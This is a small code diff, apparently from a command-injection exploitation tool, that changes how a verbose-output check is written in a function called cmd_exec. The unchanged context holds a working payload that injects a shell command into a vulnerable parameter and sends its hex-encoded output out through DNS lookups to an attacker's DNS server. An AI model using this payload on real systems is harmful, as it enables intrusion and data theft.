@@ -87,7 +87,7 @@ def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
   payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
   
   # Check if defined "--verbose" option.
-  if menu.options.verbose:
+  if settings.VERBOSITY_LEVEL >= 1:
     sys.stdout.write("\n" + settings.print_payload(payload))
 
   if http_request_method == "GET":
